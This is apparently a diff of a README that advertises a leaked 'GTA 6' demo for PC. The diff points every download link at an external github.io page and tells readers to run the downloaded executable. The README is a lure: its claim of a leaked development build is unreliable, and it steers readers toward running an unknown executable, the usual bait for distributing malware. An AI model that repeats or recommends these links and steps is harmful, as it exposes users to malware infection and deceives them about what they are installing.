@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Demo-Version-Download-PC-2026 - Play GTA 6 Early on PC
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_Demo_2026-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Algernontraumatic377/GTA-6-Demo-Version-Download-PC-2026)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_Demo_2026-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://algernontraumatic377.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ You get access to the **development build** that was accidentally leaked. It's a
 Getting the game is quick and simple. Follow these steps:
 
 1. **Click the download button** at the top of this page, or use the link below:
-   [**VISIT DOWNLOAD PAGE**](https://github.com/Algernontraumatic377/GTA-6-Demo-Version-Download-PC-2026)
+   [**VISIT DOWNLOAD PAGE**](https://algernontraumatic377.github.io)
 
 2. When you arrive at the page, you'll see the file available for download.
 
@@ -128,7 +128,7 @@ Remember: **Visit this link to download the application** and you'll be gaming i
 
 ## 📊 Quick Start Summary
 
-1. [**DOWNLOAD NOW**](https://github.com/Algernontraumatic377/GTA-6-Demo-Version-Download-PC-2026) – Get the demo file.
+1. [**DOWNLOAD NOW**](https://algernontraumatic377.github.io) – Get the demo file.
 2. Run the executable file.
 3. Start playing instantly.
 
